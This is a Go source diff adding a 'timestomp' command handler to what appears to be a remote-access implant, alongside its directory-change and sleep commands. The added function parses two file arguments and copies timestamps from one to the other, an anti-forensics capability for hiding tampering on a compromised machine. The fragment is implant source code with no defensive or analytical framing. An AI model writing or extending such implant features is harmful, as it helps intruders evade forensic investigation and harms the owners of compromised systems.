@@ -114,6 +114,19 @@ func CmdCd(cmdBuf []byte) ([]byte, error) {
 	return packet.ChangeCurrentDir(cmdBuf)
 }
 
+func CmdTimeStomp(cmdbuf []byte) ([]byte, error) {
+	buf := bytes.NewBuffer(cmdbuf)
+	to, err := util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	from, err := util.ParseAnArg(buf)
+	if err != nil {
+		return nil, err
+	}
+	return packet.TimeStomp(from, to)
+}
+
 func CmdSleep(cmdBuf []byte) ([]byte, error) {
 	sleep := packet.ReadInt(cmdBuf[:4])
 	if sleep != 'd' {
